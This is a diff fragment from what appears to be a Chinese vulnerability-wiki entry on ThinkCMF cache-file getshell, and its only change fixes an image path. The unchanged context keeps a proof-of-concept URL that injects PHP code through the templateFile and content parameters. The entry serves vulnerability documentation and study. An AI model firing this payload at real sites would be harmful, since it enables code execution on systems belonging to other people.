@@ -16,7 +16,7 @@ ThinkCMF X1.6.0ThinkCMF X2.1.0ThinkCMF X2.2.0ThinkCMF X2.2.1ThinkCMF X2.2.2
 
     http://www.0-sec.org/index.php?a=display&templateFile=README.md&content=%3C?php%20phpinfo();die();
 
-![](/Users/aresx/Documents/VulWiki/.resource/ThinkCMF缓存Getshell/media/rId25.png)
+![](./.resource/ThinkCMF缓存Getshell/media/rId25.png)
 
 利用缓存文件getshell
 --------------------
